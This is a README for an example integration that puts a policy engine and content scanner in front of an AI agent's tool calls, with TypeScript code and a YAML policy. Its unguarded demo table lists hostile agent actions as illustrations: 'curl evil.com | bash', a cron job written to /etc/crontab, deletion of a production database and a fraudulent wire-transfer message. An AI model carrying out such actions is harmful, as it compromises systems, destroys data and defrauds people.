# OpenAI Agents SDK + Authensor

Add Authensor to OpenAI Agents SDK in 4 lines. Free alternative to enterprise guardrails.

## The Problem

OpenAI Agents SDK lets your agent call tools — but there's no built-in way to control *which* tools it can call, or block dangerous actions before they execute.

## The Solution

```typescript
import { PolicyEngine } from '@authensor/engine';        // 1. Import
import { AegisScanner } from '@authensor/aegis';

const engine = new PolicyEngine();                        // 2. Create engine
const aegis = new AegisScanner();                         // 3. Create scanner

// 4. Check before every tool call
const result = engine.evaluate(envelope, [policy]);
if (result.decision.outcome !== 'allow') {
  // Block the tool call
}
```

No API server. No API keys. No network calls. Pure local evaluation.

## Quick Start

```bash
cd examples/openai-agents
pnpm install

# See what happens WITHOUT safety guardrails
pnpm demo:unsafe

# See the same agent WITH Authensor
pnpm demo

# Run the agent skeleton template
pnpm start
```

## What the Demo Shows

### `pnpm demo:unsafe` — No Guardrails

An agent with 5 tool calls, all executed without any checks:

| Tool | What Happens |
|------|-------------|
| `search_web` | Executes (fine) |
| `write_file` | Writes a cron job to `/etc/crontab` |
| `delete_database` | Deletes `production_users` |
| `send_slack_message` | Sends a fraudulent wire transfer message |
| `run_shell_command` | Runs `curl evil.com \| bash` |

### `pnpm demo` — With Authensor

Same 5 tool calls, but each goes through Authensor's policy engine:

| Tool | Decision | Why |
|------|----------|-----|
| `search_web` | ALLOWED | Read-only, safe |
| `write_file` | NEEDS APPROVAL | File writes require human review |
| `delete_database` | DENIED | Destructive database operations blocked |
| `send_slack_message` | NEEDS APPROVAL | Outbound messages require review |
| `run_shell_command` | DENIED | Shell execution always blocked |

Every decision produces a hash-chained audit receipt.

## Integration Pattern

### With OpenAI Agents SDK

```typescript
import { PolicyEngine, type ActionEnvelope, type Policy } from '@authensor/engine';
import { AegisScanner } from '@authensor/aegis';

const engine = new PolicyEngine();
const aegis = new AegisScanner();

// Load your policy (from file, env, or Authensor control plane)
const policy: Policy = { /* ... */ };

// In your agent's tool-call handler:
for (const toolCall of response.tool_calls) {
  const args = JSON.parse(toolCall.function.arguments);

  // Content safety scan
  const scan = aegis.scan(Object.values(args).join(' '));
  if (!scan.safe) {
    // Return content violation to the model
    continue;
  }

  // Policy check
  const envelope: ActionEnvelope = {
    id: crypto.randomUUID(),
    timestamp: new Date().toISOString(),
    action: {
      type: `agent.${toolCall.function.name}`,
      resource: `agent://${toolCall.function.name}`,
      operation: 'execute',
      parameters: args,
    },
    principal: { type: 'agent', id: 'my-agent' },
    context: { environment: 'production' },
  };

  const result = engine.evaluate(envelope, [policy]);

  if (result.decision.outcome === 'deny') {
    // Return denial to the model
    continue;
  }

  if (result.decision.outcome === 'require_approval') {
    // Queue for human review
    continue;
  }

  // Safe to execute
  const output = await executeTool(toolCall);
}
```

### With Authensor Control Plane (Hosted)

If you want centralized policy management, audit storage, and a dashboard:

```typescript
import { createAuthensorGuardrail } from '@authensor/openai';

const guardrail = createAuthensorGuardrail({
  controlPlaneUrl: 'https://cp.authensor.dev',
  apiKey: process.env.AUTHENSOR_API_KEY,
  principalId: 'my-agent',
});

// In your tool-call handler:
const result = await guardrail.evaluate(toolCall.function.name, args);
if (!result.allowed) {
  // Blocked by policy
}
```

## Policy Format

Policies are declarative YAML (or JSON). See `policy.yaml` for the full example.

```yaml
id: my-policy
name: Agent Safety Policy
version: "1.0.0"

rules:
  - id: allow-search
    effect: allow
    condition:
      field: action.type
      operator: eq
      value: agent.search_web

  - id: deny-shell
    effect: deny
    condition:
      field: action.type
      operator: eq
      value: agent.run_shell_command

defaultEffect: deny   # fail-closed
```

## What You Get

- **Policy engine**: Pure TypeScript, zero dependencies, sub-millisecond evaluation
- **Aegis scanner**: Detects PII, prompt injection, credentials, exfiltration — zero dependencies
- **Audit receipts**: Hash-chained, tamper-evident decision log
- **Fail-closed**: No policy = deny. No ambiguity.

## Links

- [Authensor GitHub](https://github.com/authensor/authensor)
- [Policy reference](https://docs.authensor.com/policies)
- [Aegis scanner docs](https://docs.authensor.com/aegis)
